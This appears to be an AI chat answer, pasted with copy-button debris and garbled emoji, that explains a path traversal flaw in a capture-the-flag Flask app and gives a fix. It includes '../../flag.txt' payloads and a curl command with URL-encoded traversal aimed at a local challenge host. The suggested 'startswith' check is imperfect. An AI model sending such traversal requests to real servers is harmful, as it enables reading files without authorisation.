üîç Key Line of Vulnerability
python
Copy
Edit
requested_path = app.root_path + "/files/" + path
app.root_path is the path to the directory where the Flask app lives (likely /challenge/).

It naively appends user input (path) to this, without sanitization.

So if path = "../../flag.txt", then:

ini
Copy
Edit
requested_path = "/challenge/files/../../flag.txt"
Which resolves to:

bash
Copy
Edit
/challenge/flag.txt
‚úîÔ∏è That‚Äôs classic path traversal!

üß™ Exploit Strategy
You're interacting with /docs/<path>, and the server internally tries to serve:

bash
Copy
Edit
/challenge/files/<path>
If you send ../../flag.txt, the resolved path becomes:

bash
Copy
Edit
/challenge/files/../../flag.txt ‚Üí /challenge/flag.txt

Try encoded variants if the above fails (depending on Flask version, it may normalize /../):
Double URL encoded:

bash
Copy
Edit
curl -v "http://challenge.localhost/docs/%2e%2e/%2e%2e/flag"

 Important Observations
The app does not use os.path.realpath() or os.path.abspath() to canonicalize the path.

It directly concatenates strings, which is a bad security practice.

Flask‚Äôs <path:path> route allows slashes, so it won‚Äôt block ../.

Defensive Notes (just for your awareness)
To prevent such vulnerabilities, developers should:

python
Copy
Edit
safe_base = os.path.realpath(app.root_path + "/files")
requested_path = os.path.realpath(os.path.join(safe_base, path))

if not requested_path.startswith(safe_base):
    flask.abort(403)  # Forbidden
